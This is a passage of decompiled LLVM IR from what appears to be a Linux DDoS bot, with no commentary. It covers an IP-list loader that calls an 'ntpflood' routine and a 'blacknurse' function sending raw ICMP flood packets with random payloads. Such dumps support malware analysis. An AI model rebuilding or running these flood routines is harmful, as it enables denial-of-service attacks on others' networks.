dec_label_pc_804b7d0:                             ; preds = %dec_label_pc_804b939
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b7de, i32* %eax.global-to-local, align 4
  %v3_804b7e7 = call i32 @_strlen(i8* %v8_804b942)
  %v4_804b7e7 = mul i32 %v3_804b7e7, -1
  %v5_804b7e7 = add i32 %v4_804b7e7, -2
  store i32 %v5_804b7e7, i32* %ecx.global-to-local, align 4
  %v5_804b7ee = sub i32 %v0_804b765, %v4_804b7e7
  %v1_804b7f1 = add i32 %v5_804b7ee, -1
  store i32 %v1_804b7f1, i32* %eax.global-to-local, align 4
  %v1_804b7f2 = inttoptr i32 %v1_804b7f1 to i8*
  %v2_804b7f2 = load i8, i8* %v1_804b7f2, align 1
  %v3_804b7f2 = zext i8 %v2_804b7f2 to i32
  %v5_804b7f2 = and i32 %v1_804b7f1, -256
  %v6_804b7f2 = or i32 %v3_804b7f2, %v5_804b7f2
  store i32 %v6_804b7f2, i32* %eax.global-to-local, align 4
  %v10_804b7f4 = icmp eq i8 %v2_804b7f2, 10
  br i1 %v10_804b7f4, label %dec_label_pc_804b824, label %dec_label_pc_804b7f8

dec_label_pc_804b7f8:                             ; preds = %dec_label_pc_804b7d0
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b7de, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804b765, i32* @edi, align 4
  %v3_804b80f = call i32 @_strlen(i8* %v8_804b942)
  %v4_804b80f = mul i32 %v3_804b80f, -1
  %v5_804b80f = add i32 %v4_804b80f, -2
  store i32 %v5_804b80f, i32* @ecx, align 4
  %v5_804b816 = sub i32 %v0_804b765, %v4_804b80f
  %v1_804b819 = add i32 %v5_804b816, -1
  store i32 %v1_804b819, i32* %eax.global-to-local, align 4
  %v1_804b81a = inttoptr i32 %v1_804b819 to i8*
  %v2_804b81a = load i8, i8* %v1_804b81a, align 1
  %v3_804b81a = zext i8 %v2_804b81a to i32
  %v5_804b81a = and i32 %v1_804b819, -256
  %v6_804b81a = or i32 %v3_804b81a, %v5_804b81a
  store i32 %v6_804b81a, i32* %eax.global-to-local, align 4
  %v10_804b81c = icmp eq i8 %v2_804b81a, 13
  %v1_804b81e = icmp eq i1 %v10_804b81c, false
  br i1 %v1_804b81e, label %dec_label_pc_804b939, label %dec_label_pc_804b824

dec_label_pc_804b824:                             ; preds = %dec_label_pc_804b7f8, %dec_label_pc_804b7d0
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b7de, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804b765, i32* @edi, align 4
  %v3_804b83b = call i32 @_strlen(i8* %v8_804b942)
  %v4_804b83b = mul i32 %v3_804b83b, -1
  %v5_804b83b = add i32 %v4_804b83b, -2
  store i32 %v5_804b83b, i32* @ecx, align 4
  %v1_804b845 = sub i32 %v5_804b842, %v4_804b83b
  %v1_804b846 = inttoptr i32 %v1_804b845 to i8*
  store i8 0, i8* %v1_804b846, align 1
  %v0_804b849 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b849, i32* %eax.global-to-local, align 4
  %v1_804b84e = icmp eq i32 %v0_804b849, 0
  %v1_804b850 = icmp eq i1 %v1_804b84e, false
  %v2_804b8ca = call i32 @malloc(i32 540)
  store i32 %v2_804b8ca, i32* %eax.global-to-local, align 4
  br i1 %v1_804b850, label %dec_label_pc_804b8c2, label %dec_label_pc_804b852

dec_label_pc_804b852:                             ; preds = %dec_label_pc_804b824
  store i32 %v2_804b8ca, i32* @global_var_807e520.80, align 32
  store i32 %v2_804b8ca, i32* %eax.global-to-local, align 4
  %v1_804b86c = inttoptr i32 %v2_804b8ca to i32*
  store i32 0, i32* %v1_804b86c, align 4
  %v0_804b872 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b872 = add i32 %v0_804b872, 4
  %v2_804b872 = inttoptr i32 %v1_804b872 to i32*
  store i32 0, i32* %v2_804b872, align 4
  %v0_804b879 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b879 = add i32 %v0_804b879, 8
  %v2_804b879 = inttoptr i32 %v1_804b879 to i32*
  store i32 0, i32* %v2_804b879, align 4
  %v0_804b880 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b880 = add i32 %v0_804b880, 12
  %v2_804b880 = inttoptr i32 %v1_804b880 to i32*
  store i32 0, i32* %v2_804b880, align 4
  %v0_804b887 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b887, i32* @ebx, align 4
  %v2_804b893 = call i32 @inet_addr(i32 %v0_804b765)
  %v1_804b89b = load i32, i32* @ebx, align 4
  %v2_804b89b = add i32 %v1_804b89b, 4
  %v3_804b89b = inttoptr i32 %v2_804b89b to i32*
  store i32 %v2_804b893, i32* %v3_804b89b, align 4
  %v0_804b89e = load i32, i32* @global_var_807e520.80, align 32
  %v2_804b8a9 = add i32 %v0_804b89e, 532
  %v3_804b8a9 = inttoptr i32 %v2_804b8a9 to i32*
  store i32 %v0_804b89e, i32* %v3_804b8a9, align 4
  %v0_804b8af = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b8af, i32* @edx, align 4
  store i32 %v0_804b8af, i32* %eax.global-to-local, align 4
  %v2_804b8ba = add i32 %v0_804b8af, 536
  %v3_804b8ba = inttoptr i32 %v2_804b8ba to i32*
  store i32 %v0_804b8af, i32* %v3_804b8ba, align 4
  br label %dec_label_pc_804b936

dec_label_pc_804b8c2:                             ; preds = %dec_label_pc_804b824
  store i32 %v2_804b8ca, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804b8e5 = inttoptr i32 %v2_804b8ca to i8*
  %v5_804b8e6 = call i32 @__GI_memset(i8* %v5_804b8e5, i32 0, i32 540)
  store i32 %v5_804b8e6, i32* %eax.global-to-local, align 4
  %v2_804b8f4 = call i32 @inet_addr(i32 %v0_804b765)
  %v2_804b901 = add i32 %v2_804b8ca, 4
  %v3_804b901 = inttoptr i32 %v2_804b901 to i32*
  store i32 %v2_804b8f4, i32* %v3_804b901, align 4
  %v0_804b904 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b904, i32* %edx.global-to-local, align 4
  %v2_804b90d = add i32 %v2_804b8ca, 536
  %v3_804b90d = inttoptr i32 %v2_804b90d to i32*
  store i32 %v0_804b904, i32* %v3_804b90d, align 4
  %v0_804b913 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b913, i32* %eax.global-to-local, align 4
  %v1_804b918 = add i32 %v0_804b913, 532
  %v2_804b918 = inttoptr i32 %v1_804b918 to i32*
  %v3_804b918 = load i32, i32* %v2_804b918, align 4
  %v2_804b921 = add i32 %v2_804b8ca, 532
  %v3_804b921 = inttoptr i32 %v2_804b921 to i32*
  store i32 %v3_804b918, i32* %v3_804b921, align 4
  %v0_804b927 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b927, i32* @edx, align 4
  store i32 %v2_804b8ca, i32* %eax.global-to-local, align 4
  %v2_804b930 = add i32 %v0_804b927, 532
  %v3_804b930 = inttoptr i32 %v2_804b930 to i32*
  store i32 %v2_804b8ca, i32* %v3_804b930, align 4
  br label %dec_label_pc_804b936

dec_label_pc_804b936:                             ; preds = %dec_label_pc_804b852, %dec_label_pc_804b8c2
  br label %dec_label_pc_804b939.outer

dec_label_pc_804b939.outer:                       ; preds = %dec_label_pc_804b936, %dec_label_pc_804b6bc
  br label %dec_label_pc_804b939

dec_label_pc_804b939:                             ; preds = %dec_label_pc_804b939.outer, %dec_label_pc_804b7f8
  %v4_804b945 = call i32 @fgets(i32 %v0_804b765, i32 128, i32 %v3_804b7c0)
  store i32 %v4_804b945, i32* %eax.global-to-local, align 4
  %v1_804b94d = icmp eq i32 %v4_804b945, 0
  %v1_804b94f = icmp eq i1 %v1_804b94d, false
  br i1 %v1_804b94f, label %dec_label_pc_804b7d0, label %dec_label_pc_804b955

dec_label_pc_804b955:                             ; preds = %dec_label_pc_804b939
  %v0_804b955 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804b955, i32* %eax.global-to-local, align 4
  %v1_804b95a = add i32 %v0_804b955, 532
  %v2_804b95a = inttoptr i32 %v1_804b95a to i32*
  %v3_804b95a = load i32, i32* %v2_804b95a, align 4
  %v1_804b96f = add i32 %arg4, 4
  store i32 %v1_804b96f, i32* %eax.global-to-local, align 4
  %v1_804b972 = inttoptr i32 %v1_804b96f to i32*
  %v2_804b972 = load i32, i32* %v1_804b972, align 4
  store i32 %v2_804b972, i32* %eax.global-to-local, align 4
  %v2_804b978 = call i32 @inet_addr(i32 %v2_804b972)
  %v1_804b989 = mul i32 %v2_804b776, 4
  store i32 %v1_804b989, i32* %edx.global-to-local, align 4
  %v2_804b997 = mul i32 %v2_804b776, 28
  %v1_804b99c = add i32 %v2_804b997, 30
  %v2_804b99f = and i32 %v1_804b99c, -16
  %v2_804b9a5 = sub i32 %v12_804b6fe, %v2_804b99f
  %v1_804b9b3 = add i32 %v2_804b9a5, 15
  %v2_804b9b6 = and i32 %v1_804b9b3, -16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804ba7b66 = icmp sgt i32 %v2_804b776, 0
  br i1 %v5_804ba7b66, label %dec_label_pc_804b9d7.lr.ph, label %dec_label_pc_804ba81

dec_label_pc_804b9d7.lr.ph:                       ; preds = %dec_label_pc_804b955
  %v3_804ba0b = or i32 %v2_804b9b6, 8
  br label %dec_label_pc_804b9d7

dec_label_pc_804b9d7:                             ; preds = %dec_label_pc_804b9d7, %dec_label_pc_804b9d7.lr.ph
  %storemerge567 = phi i32 [ 0, %dec_label_pc_804b9d7.lr.ph ], [ %v4_804ba72, %dec_label_pc_804b9d7 ]
  %v1_804b9dd = mul i32 %storemerge567, 4
  %v2_804b9eb = mul i32 %storemerge567, 28
  %v3_804b9f0 = add i32 %v2_804b9eb, %v2_804b9b6
  %v4_804b9f0 = inttoptr i32 %v3_804b9f0 to i32*
  store i32 %storemerge567, i32* %v4_804b9f0, align 4
  store i32 %v2_804b9b6, i32* %ecx.global-to-local, align 4
  store i32 %v2_804b9eb, i32* %edx.global-to-local, align 4
  %v4_804ba0b = add i32 %v3_804ba0b, %v2_804b9eb
  %v5_804ba0b = inttoptr i32 %v4_804ba0b to i32*
  store i32 2, i32* %v5_804ba0b, align 4
  %v1_804ba15 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba15 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ba15 = add i32 %v1_804ba15, 12
  %v4_804ba15 = add i32 %v3_804ba15, %v2_804ba15
  %v5_804ba15 = inttoptr i32 %v4_804ba15 to i32*
  store i32 %v2_804b978, i32* %v5_804ba15, align 4
  %v1_804ba1f = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba1f = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ba1f = add i32 %v1_804ba1f, 16
  %v4_804ba1f = add i32 %v3_804ba1f, %v2_804ba1f
  %v5_804ba1f = inttoptr i32 %v4_804ba1f to i32*
  %v1_804ba29 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba29 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ba29 = add i32 %v1_804ba29, 20
  %v4_804ba29 = add i32 %v3_804ba29, %v2_804ba29
  %v5_804ba29 = inttoptr i32 %v4_804ba29 to i32*
  %v1_804ba45 = add i32 %v3_804b9f0, 4
  %v2_804ba4b = inttoptr i32 %v1_804ba45 to i32*
  store i32 %v3_804b95a, i32* %v2_804ba4b, align 4
  store i32 %v2_804b9b6, i32* %ecx.global-to-local, align 4
  store i32 %v1_804b9dd, i32* %edx.global-to-local, align 4
  store i32 %v3_804b9f0, i32* %eax.global-to-local, align 4
  %v0_804ba66 = load i32, i32* @esp, align 4
  %v2_804ba69 = add i32 %v0_804ba66, -16
  %v3_804ba69 = inttoptr i32 %v2_804ba69 to i32*
  store i32 %v3_804b9f0, i32* %v3_804ba69, align 4
  %v0_804ba6a = call i32 @ntpflood()
  %v0_804ba6f = load i32, i32* @esp, align 4
  %v1_804ba6f = add i32 %v0_804ba6f, 16
  %v4_804ba72 = add nuw nsw i32 %storemerge567, 1
  store i32 %v4_804ba72, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804ba72, %v2_804b776
  br i1 %exitcond, label %dec_label_pc_804ba81, label %dec_label_pc_804b9d7

dec_label_pc_804ba81:                             ; preds = %dec_label_pc_804b9d7, %dec_label_pc_804b955
  %v0_804ba91.lcssa = phi i32 [ %v2_804b9a5, %dec_label_pc_804b955 ], [ %v1_804ba6f, %dec_label_pc_804b9d7 ]
  %storemerge5.lcssa = phi i32 [ 0, %dec_label_pc_804b955 ], [ %v2_804b776, %dec_label_pc_804b9d7 ]
  %v1_804ba84 = add i32 %arg4, 8
  store i32 %v1_804ba84, i32* %eax.global-to-local, align 4
  %v1_804ba87 = inttoptr i32 %v1_804ba84 to i32*
  %v2_804ba87 = load i32, i32* %v1_804ba87, align 4
  store i32 %v2_804ba87, i32* %edx.global-to-local, align 4
  store i32 %v1_804b96f, i32* %eax.global-to-local, align 4
  %v2_804ba8f = load i32, i32* %v1_804b972, align 4
  store i32 %v2_804ba8f, i32* %eax.global-to-local, align 4
  %v2_804ba94 = add i32 %v0_804ba91.lcssa, -16
  %v3_804ba94 = inttoptr i32 %v2_804ba94 to i32*
  store i32 %v2_804ba87, i32* %v3_804ba94, align 4
  %v0_804ba95 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ba95 = add i32 %v0_804ba91.lcssa, -20
  %v3_804ba95 = inttoptr i32 %v2_804ba95 to i32*
  store i32 %v0_804ba95, i32* %v3_804ba95, align 4
  %v5_804ba96 = add i32 %v0_804ba91.lcssa, -24
  %v6_804ba96 = inttoptr i32 %v5_804ba96 to i32*
  store i32 %arg2, i32* %v6_804ba96, align 4
  %v1_804ba99 = add i32 %v0_804ba91.lcssa, -28
  %v2_804ba99 = inttoptr i32 %v1_804ba99 to i32*
  store i32 ptrtoint ([36 x i8]* @global_var_8069310.155 to i32), i32* %v2_804ba99, align 4
  %v5_804ba9e = add i32 %v0_804ba91.lcssa, -32
  %v6_804ba9e = inttoptr i32 %v5_804ba9e to i32*
  store i32 %arg1, i32* %v6_804ba9e, align 4
  %v2_804baa1 = call i32 @Send(i32 %storemerge5.lcssa, i32 128)
  store i32 %v2_804baa1, i32* %eax.global-to-local, align 4
  %v0_804baa6 = load i32, i32* @esp, align 4
  %v1_804baa6 = add i32 %v0_804baa6, 32
  %v1_804bb62 = add i32 %arg4, 24
  %v1_804bb65 = inttoptr i32 %v1_804bb62 to i32*
  br label %dec_label_pc_804bb5f

dec_label_pc_804bab5:                             ; preds = %dec_label_pc_804bb5f
  store i32 5000, i32* %edx.global-to-local, align 4
  store i32 50000, i32* %eax.global-to-local, align 4
  %v3_804bae3 = inttoptr i32 %v0_804bb70 to i32*
  store i32 50000, i32* %v3_804bae3, align 4
  %v1_804bae4 = sext i32 %storemerge to i64
  %v2_804bae4 = call i32 @usleep(i64 %v1_804bae4)
  %v0_804bae9 = load i32, i32* @esp, align 4
  %v1_804bae9 = add i32 %v0_804bae9, 16
  %v0_804baec = load i64, i64* @global_var_807d500.88, align 8
  %sext = mul i64 %v0_804baec, 4294967296
  %v2_804baf5 = sdiv i64 %sext, 4294967296
  %v4_804baf5 = mul nsw i64 %v2_804baf5, 20
  %v5_804baf5 = trunc i64 %v4_804baf5 to i32
  store i32 %v5_804baf5, i32* %edx.global-to-local, align 4
  %tmp = icmp ugt i32 %v5_804baf5, %v2_804b78d
  %v0_804bb24 = load i32, i32* @global_var_807d3c8.89, align 8
  store i32 %v0_804bb24, i32* %eax.global-to-local, align 4
  br i1 %tmp, label %dec_label_pc_804baff, label %dec_label_pc_804bb24

dec_label_pc_804baff:                             ; preds = %dec_label_pc_804bab5
  %tmp59 = icmp slt i32 %v0_804bb24, 1
  %tmp60 = icmp eq i1 %tmp59, false
  br i1 %tmp60, label %dec_label_pc_804bb17, label %dec_label_pc_804bb08

dec_label_pc_804bb08:                             ; preds = %dec_label_pc_804baff
  %v0_804bb08 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804bb0d = add i32 %v0_804bb08, 100
  store i32 %v1_804bb0d, i32* %eax.global-to-local, align 4
  store i32 %v1_804bb0d, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804bb52

dec_label_pc_804bb17:                             ; preds = %dec_label_pc_804baff
  %v1_804bb1c = add i32 %v0_804bb24, -1
  store i32 %v1_804bb1c, i32* %eax.global-to-local, align 4
  store i32 %v1_804bb1c, i32* @global_var_807d3c8.89, align 8
  br label %dec_label_pc_804bb52

dec_label_pc_804bb24:                             ; preds = %dec_label_pc_804bab5
  %v1_804bb29 = add i32 %v0_804bb24, 1
  store i32 %v1_804bb29, i32* @global_var_807d3c8.89, align 8
  %v0_804bb2f = load i32, i32* @global_var_806ffa8.90, align 8
  store i32 %v0_804bb2f, i32* %eax.global-to-local, align 4
  %v1_804bb34 = add i32 %v0_804bb2f, -25
  %v5_804bb34 = icmp ult i32 %v0_804bb2f, 25
  %v9_804bb34 = icmp eq i32 %v1_804bb34, 0
  %v2_804bb37 = or i1 %v5_804bb34, %v9_804bb34
  br i1 %v2_804bb37, label %dec_label_pc_804bb48, label %dec_label_pc_804bb39

dec_label_pc_804bb39:                             ; preds = %dec_label_pc_804bb24
  store i32 %v1_804bb34, i32* %eax.global-to-local, align 4
  store i32 %v1_804bb34, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804bb52

dec_label_pc_804bb48:                             ; preds = %dec_label_pc_804bb24
  store i32 0, i32* @global_var_806ffa8.90, align 8
  br label %dec_label_pc_804bb52

dec_label_pc_804bb52:                             ; preds = %dec_label_pc_804bb39, %dec_label_pc_804bb17, %dec_label_pc_804bb08, %dec_label_pc_804bb48
  store i64 0, i64* @global_var_807d500.88, align 256
  %v4_804bb5c = add i32 %storemerge, 1
  br label %dec_label_pc_804bb5f

dec_label_pc_804bb5f:                             ; preds = %dec_label_pc_804ba81, %dec_label_pc_804bb52
  %v0_804bb67 = phi i32 [ %v1_804bae9, %dec_label_pc_804bb52 ], [ %v1_804baa6, %dec_label_pc_804ba81 ]
  %storemerge = phi i32 [ %v4_804bb5c, %dec_label_pc_804bb52 ], [ 0, %dec_label_pc_804ba81 ]
  store i32 %v1_804bb62, i32* %eax.global-to-local, align 4
  %v2_804bb65 = load i32, i32* %v1_804bb65, align 4
  store i32 %v2_804bb65, i32* %eax.global-to-local, align 4
  %v2_804bb6a = add i32 %v0_804bb67, -16
  %v3_804bb6a = inttoptr i32 %v2_804bb6a to i32*
  store i32 %v2_804bb65, i32* %v3_804bb6a, align 4
  %v1_804bb6b = call i32 @atol(i32 %storemerge)
  %v0_804bb70 = load i32, i32* @esp, align 4
  %v9_804bb73 = mul i32 %v1_804bb6b, 20
  store i32 %v9_804bb73, i32* %eax.global-to-local, align 4
  %v8_804bb7a = icmp sgt i32 %v9_804bb73, %storemerge
  br i1 %v8_804bb7a, label %dec_label_pc_804bab5, label %dec_label_pc_804bb80

dec_label_pc_804bb80:                             ; preds = %dec_label_pc_804bb5f
  %v2_804bb83 = inttoptr i32 %v0_804bb70 to i32*
  store i32 0, i32* %v2_804bb83, align 4
  %v1_804bb85 = call i32 @__GI_exit(i32 %storemerge)
  store i32 %v1_804bb85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb8a

dec_label_pc_804bb8a:                             ; preds = %dec_label_pc_804b67b, %entry, %dec_label_pc_804bb80
  %v0_804bb97 = phi i32 [ %v1_804b6a7, %dec_label_pc_804b67b ], [ %v1_804b61e, %entry ], [ %v1_804bb85, %dec_label_pc_804bb80 ]
  ret i32 %v0_804bb97

; uselistorder directives
  uselistorder i32 %v9_804bb73, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v1_804bb34, { 1, 0, 2 }
  uselistorder i32 %v0_804bb24, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804bb62, { 1, 0 }
  uselistorder i32 %v2_804b9eb, { 0, 2, 1 }
  uselistorder i32 %storemerge567, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804b9b6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804b8af, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804b89e, { 1, 0 }
  uselistorder i32 %v2_804b8ca, { 2, 1, 3, 4, 5, 0, 9, 8, 7, 6, 10 }
  uselistorder i32 %v2_804b776, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_804b765, { 9, 5, 4, 6, 1, 3, 2, 0, 7, 8 }
  uselistorder i32 %v2_804b74b, { 2, 1, 0 }
  uselistorder i32 %v4_804b6af, { 1, 0 }
  uselistorder i32 %v4_804b655, { 1, 0 }
  uselistorder i32* %stack_var_-1164, { 2, 0, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 7, 8, 9, 1, 2, 4, 5, 3, 6, 10, 11, 12, 13, 14, 16, 15, 63, 17, 18, 19, 38, 20, 21, 22, 23, 25, 26, 27, 28, 29, 24, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62 }
  uselistorder i32 %arg4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bb8a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bb5f, { 1, 0 }
  uselistorder label %dec_label_pc_804bb52, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b936, { 1, 0 }
  uselistorder label %dec_label_pc_804b67b, { 1, 0 }
  uselistorder label %dec_label_pc_804b655, { 1, 0 }
}

define i32 @blacknurse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v2_804bba4 = ptrtoint i32* %stack_var_-92 to i32
  %tmp46 = bitcast i32* %stack_var_-92 to i8*
  store i32 %v2_804bba4, i32* @edi, align 4
  store i32 ptrtoint (i8** @global_var_8069340.156 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804bbb4 = call i8* @_memcpy(i8* %tmp46, i8* bitcast (i8** @global_var_8069340.156 to i8*), i32 9)
  %v2_804bbc2 = call i32 @__GI_time(i32* null)
  store i32 %v2_804bbc2, i32* @eax, align 4
  %v1_804bbd3 = call i32 @mfork(i32 %arg2)
  %v1_804bbdb = icmp eq i32 %v1_804bbd3, 0
  %v1_804bbdd = icmp eq i1 %v1_804bbdb, false
  br i1 %v1_804bbdd, label %dec_label_pc_804bdd2, label %dec_label_pc_804bbe3

dec_label_pc_804bbe3:                             ; preds = %entry
  %v3_804bbef = call i32 @socket(i32 2, i32 3, i32 255)
  %v5_804bbfa = icmp slt i32 %v3_804bbef, 0
  %v1_804bbfe = icmp eq i1 %v5_804bbfa, false
  br i1 %v1_804bbfe, label %dec_label_pc_804bc0a, label %dec_label_pc_804bc00

dec_label_pc_804bc00:                             ; preds = %dec_label_pc_804bbe3
  %v1_804bc05 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bc0a

dec_label_pc_804bc0a:                             ; preds = %dec_label_pc_804bbe3, %dec_label_pc_804bc00
  %v4_804bc0a = add i32 %arg3, -1
  %v9_804bc0a = sub i32 0, %arg3
  %v10_804bc0a = and i32 %arg3, %v9_804bc0a
  %v11_804bc0a = icmp slt i32 %v10_804bc0a, 0
  %v12_804bc0a = icmp eq i32 %v4_804bc0a, 0
  %v13_804bc0a = icmp slt i32 %v4_804bc0a, 0
  %v3_804bc0e = icmp eq i1 %v13_804bc0a, %v11_804bc0a
  %v4_804bc0e = icmp eq i1 %v12_804bc0a, false
  %v5_804bc0e = and i1 %v4_804bc0e, %v3_804bc0e
  br i1 %v5_804bc0e, label %dec_label_pc_804bc0a.dec_label_pc_804bc30_crit_edge, label %dec_label_pc_804bc10

dec_label_pc_804bc0a.dec_label_pc_804bc30_crit_edge: ; preds = %dec_label_pc_804bc0a
  br label %dec_label_pc_804bc30

dec_label_pc_804bc10:                             ; preds = %dec_label_pc_804bc0a
  %v4_804bc1e = call i32 @Send(i32 %arg1, i32 ptrtoint ([41 x i8]* @global_var_8069364.157 to i32))
  %v2_804bc2b = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bc30

dec_label_pc_804bc30:                             ; preds = %dec_label_pc_804bc0a.dec_label_pc_804bc30_crit_edge, %dec_label_pc_804bc10
  %v1_804bc33 = add i32 %arg4, 4
  %v1_804bc36 = inttoptr i32 %v1_804bc33 to i32*
  %v2_804bc36 = load i32, i32* %v1_804bc36, align 4
  %v1_804bc3e = add i32 %arg4, 8
  %v1_804bc41 = inttoptr i32 %v1_804bc3e to i32*
  %v2_804bc41 = load i32, i32* %v1_804bc41, align 4
  %v2_804bc47 = call i32 @atol(i32 %v2_804bc41)
  %v2_804bc52 = ptrtoint i32* %stack_var_-128 to i32
  %tmp47 = bitcast i32* %stack_var_-128 to i8*
  store i32 %v2_804bc52, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804bc66 = call i8* @_memset(i8* %tmp47, i32 0, i32 8)
  %v6_804bc66 = ptrtoint i8* %v5_804bc66 to i32
  store i32 %v6_804bc66, i32* @ecx, align 4
  %v2_804bc6f = ptrtoint i32* %stack_var_-96 to i32
  %v8_804bc79 = inttoptr i32 %v2_804bc36 to i8*
  %v7_804bc7c = call i32 @getaddrinfo(i8* %v8_804bc79, i32 0, i32 %v2_804bc52, i32 %v2_804bc6f)
  %v4_804bc87 = icmp eq i32 %v7_804bc7c, 0
  br i1 %v4_804bc87, label %dec_label_pc_804bc97, label %dec_label_pc_804bc8d

dec_label_pc_804bc8d:                             ; preds = %dec_label_pc_804bc30
  %v2_804bc92 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bc97

dec_label_pc_804bc97:                             ; preds = %dec_label_pc_804bc30, %dec_label_pc_804bc8d
  %v5_804bca0 = call i32 @socket(i32 2, i32 3, i32 1)
  %v13_804bcab = icmp eq i32 %v5_804bca0, -1
  %v1_804bcaf = icmp eq i1 %v13_804bcab, false
  br i1 %v1_804bcaf, label %dec_label_pc_804bc97.dec_label_pc_804bccb_crit_edge, label %dec_label_pc_804bcb1

dec_label_pc_804bc97.dec_label_pc_804bccb_crit_edge: ; preds = %dec_label_pc_804bc97
  br label %dec_label_pc_804bccb

dec_label_pc_804bcb1:                             ; preds = %dec_label_pc_804bc97
  %v3_804bcb9 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806938d.158, i32 0, i32 0))
  %v2_804bcc6 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_804bccb

dec_label_pc_804bccb:                             ; preds = %dec_label_pc_804bc97.dec_label_pc_804bccb_crit_edge, %dec_label_pc_804bcb1
  %v4_804bcd9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_8069394.159 to i32))
  store i32 %v5_804bca0, i32* %stack_var_-136, align 4
  %tmp49 = bitcast i32* %stack_var_-136 to %pollfd*
  %v5_804bdb2 = add i32 %v2_804bc47, %v2_804bbc2
  br label %dec_label_pc_804bcf8.outer

dec_label_pc_804bcf8.outer:                       ; preds = %dec_label_pc_804bdca, %dec_label_pc_804bccb
  %stack_var_-32.0.ph = phi i32 [ %v4_804bdca, %dec_label_pc_804bdca ], [ %tmp, %dec_label_pc_804bccb ]
  br label %dec_label_pc_804bcf8

dec_label_pc_804bcf8:                             ; preds = %dec_label_pc_804bcf8.outer, %dec_label_pc_804bd52
  br label %dec_label_pc_804bd01

dec_label_pc_804bd01:                             ; preds = %dec_label_pc_804bcf8, %dec_label_pc_804bd01
  %v4_804bd1351 = phi i32 [ 20, %dec_label_pc_804bcf8 ], [ %v5_804bd10, %dec_label_pc_804bd01 ]
  %v5_804bd06 = add i32 %v4_804bd1351, %v2_804bba4
  store i32 %v5_804bd06, i32* @ebx, align 4
  %v0_804bd09 = call i32 @random()
  %v1_804bd09 = trunc i32 %v0_804bd09 to i8
  %v3_804bd0e = load i32, i32* @ebx, align 4
  %v4_804bd0e = inttoptr i32 %v3_804bd0e to i8*
  store i8 %v1_804bd09, i8* %v4_804bd0e, align 1
  %v5_804bd10 = add nuw nsw i32 %v4_804bd1351, 1
  %exitcond = icmp eq i32 %v5_804bd10, 32
  br i1 %exitcond, label %dec_label_pc_804bd19, label %dec_label_pc_804bd01

dec_label_pc_804bd19:                             ; preds = %dec_label_pc_804bd01
  %v3_804bd19 = load i32, i32* %stack_var_-96, align 4
  %v1_804bd1c = add i32 %v3_804bd19, 16
  %v2_804bd1c = inttoptr i32 %v1_804bd1c to i32*
  %v3_804bd1c = load i32, i32* %v2_804bd1c, align 4
  %v1_804bd22 = add i32 %v3_804bd19, 20
  %v2_804bd22 = inttoptr i32 %v1_804bd22 to i32*
  %v3_804bd22 = load i32, i32* %v2_804bd22, align 4
  store i32 %v5_804bca0, i32* %stack_var_-204, align 4
  %v8_804bd35 = call i32 @sendto(i32 %v5_804bca0, i32 %v2_804bba4, i32 36, i32 0, i32 %v3_804bd22, i32 %v3_804bd1c)
  %v12_804bd42 = icmp eq i32 %v8_804bd35, 36
  br i1 %v12_804bd42, label %dec_label_pc_804bd9c, label %dec_label_pc_804bd46

